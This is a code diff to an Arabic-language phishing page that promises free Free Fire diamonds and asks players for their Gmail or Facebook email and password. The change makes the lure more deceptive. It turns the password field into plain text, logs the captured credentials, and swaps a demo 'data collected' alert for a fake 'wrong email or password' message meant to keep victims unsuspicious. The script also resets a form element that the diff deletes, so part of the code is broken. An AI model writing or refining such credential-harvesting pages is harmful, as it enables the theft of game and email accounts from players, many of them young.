@@ -14,30 +14,18 @@
         <h1>مكافأة الماس المجانية من فري فاير</h1>
         <p>يرجى وضع معلومات حسابك في فري فاير أدناه لتأكيد هويتك.</p>
         
-        <form id="infoForm">
-            <input type="text" id="email" placeholder="Gmail/Facebook email" required>
-            <input type="password" id="password" placeholder="كلمة مرور حسابك" required>
-            <button type="submit">اقبل</button>
-        </form>
+        <input type="text" id="email" placeholder="Gmail/Facebook email" required>
+        <input type="text" id="password" placeholder="كلمة مرور حسابك" required> <!-- Use type="text" -->
+        <button onclick="gatherInfo()">اقبل</button>
     </main>
-    
     <script>
-        document.getElementById('infoForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the default form submission
-
+        function gatherInfo() {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-
-            // Log the email and password to the console for testing
-            console.log('Email:', email);
-            console.log('Password:', password);
-            
-            // Alert for demonstration purposes
-            alert('Your data has been collected! Check the console for details.');
-            
-            // Optionally, clear the input fields after submission
-            document.getElementById('infoForm').reset();
-        });
+            console.log(`Email: ${email}, Password: ${password}`); // Log to the console
+            alert('البريد الإلكتروني أو كلمة المرور خاطئة!'); // Alert message
+            document.getElementById('infoForm').reset(); // Reset form fields (if applicable)
+        }
     </script>
 </body>
 </html>
